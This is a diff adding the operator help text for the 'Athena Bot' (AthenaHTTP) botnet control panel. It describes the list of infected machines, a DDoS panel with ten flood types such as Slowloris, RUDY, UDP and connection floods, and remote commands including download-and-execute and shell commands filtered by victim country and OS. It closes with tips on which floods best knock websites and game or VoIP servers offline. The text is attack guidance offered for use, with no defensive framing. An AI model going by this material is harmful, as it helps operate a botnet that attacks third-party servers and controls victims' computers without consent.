@@ -1,0 +1,85 @@
+<b>Botlist:</b>
+	<u>Details</u>:
+	All bots are displayed in this list. General information is displayed about each bot(Bot Id, Country, IP Address, Operating System, Ram Usage, Bot Version, Last Seen, and Status). Each bot has a button labeled 'Info' to the right of its listing - it can be clicked to display detailed information about the bot.
+
+	
+<b>DDoS Panel:</b>
+	<u>Details</u>:
+	This page is dedicated to the creation of DDoS attacks. Athena Bot supports 10 different kinds of DDoS(2 Layer4, 8 Layer7).
+
+	<u>Additional Information:</u>
+	-You can run Browser-Based attacks concurrently with non-Browser-Based attacks.
+	-When filling out the DDoS Panel form, make sure you fill it out properly. Improper filling of the form will result in a non-functional attack.
+	-Pay attention to the amount of busy/free bots. Better awareness of those statistics make coordination of attacks easier.
+	
+	<u>Attack Types:</u>
+	
+	Layer 7(Application layer floods)...
+	Slowloris: Attacks a target webserver with many concurrent connections
+	Rapid HTTP GET: Sends mass amounts of randomized and realistic GET packets to a given target
+	RUDY(r-u-dead-yet): Slowly posts content by the masses to a target webserver
+	Rapid HTTP POST: Sends mass amounts of randomized and realistic POST packets to a given target
+	Slow HTTP POST: Holds many concurrent connections to a webserver through POST methods
+	ARME(Apache Remote Memory Exhaustion): Abuses partial content headers in order to harm a target webserver
+	Bandwith: This is a download based flood targetted torwards larger files and downloadable content on websites
+	
+	Layer 4(Transport Layer floods)...
+	UDP: Sends mass amounts of packets containing random data to a target host/ip
+	ECF(Established Connection Flood): Floods a target with rapid connections and disconnections (Also known as SSYN in other software)
+		
+		
+<b>Website Checker:</b>
+	<u>Details</u>:
+	This feature is for testing the status of websites. It utilizes bots as test-servers and will display the HTTP-Status-Codes(<a href=http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html>http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a>) retrieved from each bot that tested the website.
+
+	<u>Additional Information:</u>
+	-Website Checks work just like commands.
+	-These can be restarted or cancelled in the 'Active Commands' page. (Admins only)
+
+	
+<b>Create Command:</b>
+	<u>Details</u>:
+	This is where all other command creation happens(Download&Execute, Download&Execute[with arguments], Update, View, View Hidden, Add/Remove/Clear SmartView, Start/Stop Botkiller, Shell Commands, and Uninstallation).
+
+	<u>Additional Information:</u>
+	-Detailed filters located on the command creation page are useful for sending commands to specific types of bots. These filters include: Country, Operating System, CPU Architecture, Computer Type, Bot Version, .NET Version, Admin/User, and Specific Bot Id.
+	-Make sure to fill all fields properly. Failure to fill the fields properly will result in a non-functional command.
+
+	
+<b>Active Commands:</b>
+	<u>Details</u>:
+	The Active Commands page displays all currently running commands including commands created on the 'DDoS Panel' page, 'Website Checker' page, and 'Create Command' page.
+
+	<u>Additional Information:</u>
+	-Any command can be restarted or cancelled via the buttons located on the right side of each command row. (Admins only)
+	-All commands can be cleared by the 'Clear All' button at the bottom of the page. (Admins only)
+	-All commands can be restarted by the 'Restart All' button located at the bottom of the page. (Admins only)
+	-Non-Admin users can only view their own commands initiated.
+
+	
+<b>User Management:</b> (Admins only)
+	<u>Details</u>:
+	AthenaHTTP supports more than just one account-login to the panel. Admin accounts can add/remove users, and can manage the commands they each have access to.
+
+	<u>Additional Information:</u>
+	-Admin accounts automatically have access to all commands
+	-Admin accounts can add/remove other admin accounts
+	-The most recent IP of users are logged and viewable on the 'User Management' page
+
+	
+<b>Preferences:</b> (Admins only)
+	<u>Details</u>:
+	-Password changes occur here
+	-Ability to change: Bot Knock Interval, Time until bots are marked dead, and clear-options
+	-Ability to set a key that protects your panel login page.
+
+	
+<b>Sidebar Statistics:</b>
+	<u>Details</u>:
+	Statistics about all existing bots.
+
+	
+<b>Extra Tips:</b>
+-It is good to try a variety of different floods when trying to take a website offline, as different servers are more-vulnerable to different kinds of floods
+-ECF and UDP floods are best for servers hosting gameservers, VoiP, TeamSpeak, IRC, etc.
+-Play with the bot a bit and become familiar with it. Using it will eventually become much easier and fluent.
